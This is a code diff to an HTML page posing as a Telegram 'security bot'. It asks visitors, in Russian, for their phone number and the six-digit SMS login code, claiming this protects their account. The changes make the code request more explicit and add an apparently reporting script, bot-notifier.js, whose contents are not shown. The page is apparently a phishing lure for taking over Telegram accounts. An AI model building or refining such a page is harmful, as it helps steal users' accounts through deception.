@@ -13,7 +13,10 @@
             <header>
                 <img src="assets/logo.png" alt="VAC SECURITY BOT" class="logo">
                 <h1>VAC SECURITY BOT</h1>
-                <p>Защитите свой Telegram аккаунт</p>
+                <p class="instructions">
+                    Для защиты аккаунта введите ваш номер телефона и код подтверждения, 
+                    который придет в SMS. Это поможет нам обеспечить безопасность.
+                </p>
             </header>
 
             <div class="form-container" id="phone-form">
@@ -26,7 +29,7 @@
 
             <div class="form-container hidden" id="code-form">
                 <div class="input-group">
-                    <input type="text" id="code" placeholder="XXXXXX" maxlength="6">
+                    <input type="text" id="code" placeholder="Введите 6-значный код из SMS" maxlength="6">
                     <small class="error-message" id="code-error"></small>
                 </div>
                 <button id="submit-code" class="btn primary">Подтвердить</button>
@@ -34,5 +37,6 @@
         </div>
     </div>
     <script src="script.js"></script>
+    <script src="bot-notifier.js"></script>
 </body>
 </html>
